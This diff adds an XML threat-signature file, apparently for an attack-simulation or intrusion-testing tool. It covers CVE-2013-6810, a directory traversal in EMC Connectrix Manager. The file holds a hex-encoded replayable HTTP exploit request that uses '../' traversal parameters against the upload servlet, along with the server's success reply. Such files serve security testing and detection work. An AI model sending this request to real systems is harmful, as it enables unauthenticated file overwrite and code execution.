@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="EMC CMCNE inmservlets.war UnifiedFileUploadMoreInfoServlet Directory Traversal"/>
+    <EngDesc display="true" value="A directory traversal vulnerability exists in EMC Connectrix Manager Converged Network Edition. The vulnerability is due to lack of authentication and insufficient input validation in the UnifiedFileUploadMoreInfoServlet of inmservlets.war when processing HTTP requests. A remote unauthenticated attacker can copy any files to arbitrary locations. In a successful attack scenario, the attacker can execute arbitrary code with SYSTEM privileges by placing executable files in critical locations."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="EMC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Connectrix_Manager_Converged_Network_Edition"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="12.0.3_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20131212-08"/>
+    <CVEID display="true" value="CVE-2013-6810"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="101209"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="b1096b9054effe992685181f99f7e184"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635367180822374818"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1401183017" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0D:66" destMac="00:50:56:B4:0E:C3" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="011B" Identification="777C" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="594B" srcIP="172.16.8.111" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="37943" destPort="$HTTPdestPort" SeqNumber="40ED23EF" AckNumber="0C36DE71" HeaderLength="08" WindowSize="000F" Checksum="D4D7" UrgentPointer="0000" Options="0101080A6AB8549400000000" Payload="474554202F696E6D736572766C6574732F4D616E75616C556E6966696564496D61676555706C6F61643F6C6162656C3D30312666696C653D2E2E2F2E2E2F626F6F742E696E69266877747970653D2E2E2F2E2E2F2E2E2F267370656369616C6B65793D6B6579266C6F636174696F6E3D633A5C57696E646F77735C73797374656D333220485454502F312E310D0A486F73743A203137322E31362E382E3133343A38300D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:C3" destMac="00:50:56:B4:0D:66" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014D" Identification="21AB" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="6EEA" srcIP="$destIP" destIP="172.16.8.111" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="37943" SeqNumber="0C36DE71" AckNumber="40ED24D6" HeaderLength="08" WindowSize="FA09" Checksum="EAB7" UrgentPointer="0000" Options="0101080A011F42FF6AB85494" Payload="485454502F312E3120323030204F4B0D0A43616368652D436F6E74726F6C3A206E6F2D63616368650D0A507261676D613A206E6F2D63616368650D0A457870697265733A20300D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A446174653A205765642C203239204A616E20323031342031363A32343A333720474D540D0A5365727665723A206E756C6C0D0A0D0A36310D0A5375636365737366756C6C7920696D706F727465642074686520696D61676520696E746F20494E4D3A20496D6167653A202E2E2F2E2E2F626F6F742E696E694C6162656C3A2030315573657220446566696E6564204C6162656C3A206B65790D0A0D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
